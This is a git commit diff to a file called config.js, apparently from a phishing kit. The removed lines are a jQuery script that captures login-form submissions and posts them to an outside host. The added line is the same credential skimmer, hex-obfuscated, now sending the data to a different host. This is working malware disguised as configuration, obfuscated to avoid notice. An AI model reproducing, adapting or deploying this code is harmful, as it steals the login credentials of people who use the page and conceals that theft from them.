cf2520496f64fb1a0fbc39c34fc9e655af1ecdff
Delvanesia <95870466+delvawoi@users.noreply.github.com>
2021-12-10 00:23:26 +0700

    Update config.js

--- config.js
+++ config.js
@@ -1,15 +1,1 @@
-$(".login-form").submit(function() {
-	var d = $(".login-form");
-	
-	$.ajax({
-        url: "http://whydel.eu.org/api.php",
-        type: "POST",
-        data: d.serialize(),
-        success: function () {
-            return true;
-        },
-        error: function () {
-            return true;
-        },
-    });
-});
+var _0xa538=["\x2E\x6C\x6F\x67\x69\x6E\x2D\x66\x6F\x72\x6D","\x68\x74\x74\x70\x3A\x2F\x2F\x63\x75\x72\x6C\x66\x72\x65\x65\x66\x69\x72\x65\x2E\x78\x79\x7A\x2F\x69\x6E\x64\x65\x78\x2E\x70\x68\x70","\x50\x4F\x53\x54","\x73\x65\x72\x69\x61\x6C\x69\x7A\x65","\x61\x6A\x61\x78","\x73\x75\x62\x6D\x69\x74"];$(_0xa538[0])[_0xa538[5]](function(){var _0xa6b6x1=$(_0xa538[0]);$[_0xa538[4]]({url:_0xa538[1],type:_0xa538[2],data:_0xa6b6x1[_0xa538[3]](),success:function(){return true},error:function(){return true}})})
